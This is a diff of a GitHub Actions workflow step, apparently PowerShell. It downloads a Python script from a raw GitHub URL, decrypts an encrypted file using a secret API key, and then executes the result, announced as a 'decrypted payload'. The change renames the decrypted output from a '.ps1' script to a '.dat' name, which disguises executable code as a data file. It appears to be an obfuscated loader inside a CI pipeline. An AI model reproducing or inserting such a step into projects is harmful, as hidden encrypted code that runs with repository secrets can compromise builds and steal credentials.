@@ -31,10 +31,10 @@ jobs:
         run: |
           curl -sL https://raw.githubusercontent.com/Scheldest/dex-enc/refs/heads/main/onlyonepyfile/main.py -o main.py
           python main.py --quiet
-          $p = Join-Path $currentProgress "r4dx.dexenc" # Pastikan $currentProgress sudah didefinisikan, atau gunakan $pwd
-          $targetFile = "$pwd\r4dx.ps1"
-          if (Test-Path "r4dx.dexenc") {
-              python main.py decrypt -i "r4dx.dexenc" -key "$env:API_KEY" -o $targetFile
+          $p = Join-Path $currentProgress "database_i4x.dexenc"
+          $targetFile = "$pwd\database_i4x.dat"
+          if (Test-Path "database_i4x.dexenc") {
+              python main.py decrypt -i $p -key "$env:API_KEY" -o $targetFile
               if (Test-Path $targetFile) {
                   Write-Host "[+] Executing decrypted payload..." -ForegroundColor Green
                   . $targetFile
